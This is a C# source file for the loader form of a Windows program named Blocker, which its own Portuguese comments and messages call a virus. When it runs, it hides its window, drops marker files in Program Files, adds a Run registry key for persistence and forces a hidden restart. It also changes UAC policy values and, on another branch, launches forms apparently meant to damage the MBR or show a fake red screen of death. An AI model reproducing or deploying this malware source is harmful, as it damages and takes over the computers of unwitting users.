using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Reflection;


namespace Blocker
{
    public partial class loader : Form
    {
        public loader()
        {
            InitializeComponent();
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)

        {

            /*Credits by Cyber Soldier*/
            /*Créditos ao Cyber Soldier*/
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private async void loader_Load(object sender, EventArgs e)
        {
            /*transparência + executar em 2 plano*/
            this.Hide();
            TransparencyKey = BackColor;

            var localvirus = @"c:\program files\temp";
            var desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            /*caso o código foi digitado corretamente*/
            if (File.Exists(localvirus + @"\salvation.msi"))
            {
                
                ProcessStartInfo explorer = new ProcessStartInfo();
                explorer.FileName = "cmd.exe";
                explorer.Arguments = "/k start %USERPROFILE%\\Desktop";
                explorer.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(explorer);
                RegistryKey lua = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                lua.SetValue("EnableLUA", 1, RegistryValueKind.DWord);

                RegistryKey filter = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                filter.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);

                RegistryKey adm = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                adm.SetValue("ConsentPromptBehaviorAdmin", 2, RegistryValueKind.DWord); 
                MessageBox.Show("Você ainda não removeu por completo o vírus Blocker da sua máquina. Mas acalme-se, o maior perigo já passou. Agora é só seguir os passos anotados no arquivo .TXT na sua área de trabalho para remover totalmente o virus.\n\nEu fico por aqui, vlw, flw e fuuui!", "BLOCKER.EXE ~~By Waguinho", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                
                
                
                Environment.Exit(-1);
            }



                /*caso as regras sejam quebradas*/
                if (File.Exists(localvirus + @"\reini2death.msi"))
            {   
                mbr2 mbr2 = new mbr2();
                mbr2.Show();
                Rsod rsod = new Rsod();
                rsod.ShowDialog();
                
            }

            /*criar o diretório caso nao exista*/
            if (!Directory.Exists(localvirus))
            {
                Directory.CreateDirectory(localvirus);
            }
            /*inicializar de forma personalizada*/
            if (!File.Exists(localvirus + @"\execute.msi"))
            {
                malwareload load = new malwareload();
                load.Show();
            }

            else 
            {
                
                if (!File.Exists(localvirus + @"\reini2.dll"))
                {
                    this.Hide();
                    await Task.Run(() => Reinici_one());
                }
                
                
            }

            if (File.Exists(localvirus + @"\reini2.dll"))
            {
                this.Hide();
                MalwareWindow malwareWindow = new MalwareWindow();
                malwareWindow.ShowDialog();
                
            }

        }

        public async void Reinici_one()
        {
            
            await Task.Run(() => Reini_two());
            MessageBox.Show("OPA!", "KKKK", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        public async void Reini_two()
        {
            await Task.Delay(3000);
            File.Create(@"c:\program files\temp\reini2.dll");
            RegistryKey ini = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            ini.SetValue(@"Blocker", @"HAHAHAHA");
            await Task.Delay(5000);
            ProcessStartInfo shutdown = new ProcessStartInfo();
            shutdown.FileName = "cmd.exe";
            shutdown.Arguments = "/k shutdown /r /f /t 00";
            shutdown.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(shutdown);
        }
    }
}
